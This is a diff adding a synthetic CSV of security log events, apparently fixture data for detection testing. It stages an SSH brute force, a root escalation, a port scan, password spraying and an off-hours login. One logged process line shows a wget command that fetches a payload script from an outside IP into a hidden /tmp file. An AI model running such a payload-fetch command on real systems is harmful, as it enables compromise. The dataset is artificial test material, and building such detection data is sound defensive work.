@@ -1,0 +1,43 @@
+timestamp,source_ip,destination_ip,source_port,destination_port,username,event_type,status,device,message
+2026-09-07T08:30:15Z,192.168.1.10,10.0.0.5,52140,443,sarah.smith,LOGIN,SUCCESS,Workstation-01,User sarah.smith authenticated successfully via Kerberos
+2026-09-07T08:35:22Z,192.168.1.10,10.0.0.20,52142,445,sarah.smith,FILE_ACCESS,SUCCESS,FileServer-01,Accessed shared share$/finance/Q3_report.xlsx
+2026-09-07T08:45:10Z,192.168.1.15,10.0.0.5,53120,443,mike.williams,LOGIN,SUCCESS,Workstation-02,User mike.williams authenticated successfully
+2026-09-07T08:50:00Z,192.168.1.25,10.0.0.5,54100,443,dev_svc,LOGIN,SUCCESS,BuildServer-01,Automated build agent session initiated
+2026-09-07T09:00:01Z,192.168.1.50,10.0.0.10,48201,22,admin,LOGIN_FAILED,FAILURE,Server01,SSH authentication failure: invalid password for admin
+2026-09-07T09:00:04Z,192.168.1.50,10.0.0.10,48202,22,admin,LOGIN_FAILED,FAILURE,Server01,SSH authentication failure: invalid password for admin
+2026-09-07T09:00:08Z,192.168.1.50,10.0.0.10,48203,22,admin,LOGIN_FAILED,FAILURE,Server01,SSH authentication failure: invalid password for admin
+2026-09-07T09:00:12Z,192.168.1.50,10.0.0.10,48204,22,admin,LOGIN_FAILED,FAILURE,Server01,SSH authentication failure: invalid password for admin
+2026-09-07T09:00:16Z,192.168.1.50,10.0.0.10,48205,22,admin,LOGIN_FAILED,FAILURE,Server01,SSH authentication failure: invalid password for admin
+2026-09-07T09:00:19Z,192.168.1.50,10.0.0.10,48206,22,admin,LOGIN_FAILED,FAILURE,Server01,SSH authentication failure: invalid password for admin
+2026-09-07T09:00:23Z,192.168.1.50,10.0.0.10,48207,22,admin,LOGIN_FAILED,FAILURE,Server01,SSH authentication failure: invalid password for admin
+2026-09-07T09:00:27Z,192.168.1.50,10.0.0.10,48208,22,admin,LOGIN_FAILED,FAILURE,Server01,SSH authentication failure: invalid password for admin
+2026-09-07T09:00:31Z,192.168.1.50,10.0.0.10,48209,22,admin,LOGIN_FAILED,FAILURE,Server01,SSH authentication failure: invalid password for admin
+2026-09-07T09:00:35Z,192.168.1.50,10.0.0.10,48210,22,admin,LOGIN_FAILED,FAILURE,Server01,SSH authentication failure: invalid password for admin
+2026-09-07T09:00:39Z,192.168.1.50,10.0.0.10,48211,22,admin,LOGIN_FAILED,FAILURE,Server01,SSH authentication failure: invalid password for admin
+2026-09-07T09:00:43Z,192.168.1.50,10.0.0.10,48212,22,admin,LOGIN_FAILED,FAILURE,Server01,SSH authentication failure: invalid password for admin
+2026-09-07T09:01:10Z,192.168.1.50,10.0.0.10,48220,22,admin,LOGIN,SUCCESS,Server01,Accepted password for admin from 192.168.1.50 port 48220 ssh2
+2026-09-07T09:02:34Z,192.168.1.50,10.0.0.10,48220,22,admin,PRIVILEGE_CHANGE,SUCCESS,Server01,sudo: pam_unix(sudo:session): session opened for user root by admin(uid=0)
+2026-09-07T09:03:12Z,10.0.0.10,203.0.113.45,51024,80,root,PROCESS_STARTED,SUCCESS,Server01,Process executed: wget http://203.0.113.45/payload.sh -O /tmp/.x
+2026-09-07T09:04:45Z,10.0.0.10,203.0.113.45,51030,443,root,NETWORK_CONNECTION,SUCCESS,Server01,Established outbound TCP connection to 203.0.113.45:443
+2026-09-07T09:10:01Z,192.168.1.72,10.0.0.15,55001,21,scanner,PORT_SCAN,BLOCKED,DBServer-01,TCP SYN to port 21 blocked by firewall
+2026-09-07T09:10:02Z,192.168.1.72,10.0.0.15,55002,22,scanner,PORT_SCAN,BLOCKED,DBServer-01,TCP SYN to port 22 blocked by firewall
+2026-09-07T09:10:03Z,192.168.1.72,10.0.0.15,55003,23,scanner,PORT_SCAN,BLOCKED,DBServer-01,TCP SYN to port 23 blocked by firewall
+2026-09-07T09:10:04Z,192.168.1.72,10.0.0.15,55004,25,scanner,PORT_SCAN,BLOCKED,DBServer-01,TCP SYN to port 25 blocked by firewall
+2026-09-07T09:10:05Z,192.168.1.72,10.0.0.15,55005,53,scanner,PORT_SCAN,BLOCKED,DBServer-01,TCP SYN to port 53 blocked by firewall
+2026-09-07T09:10:06Z,192.168.1.72,10.0.0.15,55006,80,scanner,PORT_SCAN,BLOCKED,DBServer-01,TCP SYN to port 80 blocked by firewall
+2026-09-07T09:10:07Z,192.168.1.72,10.0.0.15,55007,110,scanner,PORT_SCAN,BLOCKED,DBServer-01,TCP SYN to port 110 blocked by firewall
+2026-09-07T09:10:08Z,192.168.1.72,10.0.0.15,55008,135,scanner,PORT_SCAN,BLOCKED,DBServer-01,TCP SYN to port 135 blocked by firewall
+2026-09-07T09:10:09Z,192.168.1.72,10.0.0.15,55009,139,scanner,PORT_SCAN,BLOCKED,DBServer-01,TCP SYN to port 139 blocked by firewall
+2026-09-07T09:10:10Z,192.168.1.72,10.0.0.15,55010,143,scanner,PORT_SCAN,BLOCKED,DBServer-01,TCP SYN to port 143 blocked by firewall
+2026-09-07T09:10:11Z,192.168.1.72,10.0.0.15,55011,443,scanner,PORT_SCAN,BLOCKED,DBServer-01,TCP SYN to port 443 blocked by firewall
+2026-09-07T09:10:12Z,192.168.1.72,10.0.0.15,55012,445,scanner,PORT_SCAN,BLOCKED,DBServer-01,TCP SYN to port 445 blocked by firewall
+2026-09-07T09:10:13Z,192.168.1.72,10.0.0.15,55013,1433,scanner,PORT_SCAN,BLOCKED,DBServer-01,TCP SYN to port 1433 blocked by firewall
+2026-09-07T09:10:14Z,192.168.1.72,10.0.0.15,55014,3306,scanner,PORT_SCAN,BLOCKED,DBServer-01,TCP SYN to port 3306 blocked by firewall
+2026-09-07T09:10:15Z,192.168.1.72,10.0.0.15,55015,3389,scanner,PORT_SCAN,BLOCKED,DBServer-01,TCP SYN to port 3389 blocked by firewall
+2026-09-07T09:10:16Z,192.168.1.72,10.0.0.15,55016,8080,scanner,PORT_SCAN,BLOCKED,DBServer-01,TCP SYN to port 8080 blocked by firewall
+2026-09-07T09:15:10Z,10.0.0.55,10.0.0.5,49101,443,alice,LOGIN_FAILED,FAILURE,AuthServer,Failed password for user alice
+2026-09-07T09:15:30Z,10.0.0.55,10.0.0.5,49102,443,bob,LOGIN_FAILED,FAILURE,AuthServer,Failed password for user bob
+2026-09-07T09:15:50Z,10.0.0.55,10.0.0.5,49103,443,charlie,LOGIN_FAILED,FAILURE,AuthServer,Failed password for user charlie
+2026-09-07T09:16:10Z,10.0.0.55,10.0.0.5,49104,443,david,LOGIN_FAILED,FAILURE,AuthServer,Failed password for user david
+2026-09-07T09:16:30Z,10.0.0.55,10.0.0.5,49105,443,emma,LOGIN_FAILED,FAILURE,AuthServer,Failed password for user emma
+2026-09-07T02:15:00Z,10.0.0.25,10.0.0.5,58120,443,john.doe,LOGIN,SUCCESS,Workstation-04,User john.doe authenticated successfully outside standard business hours
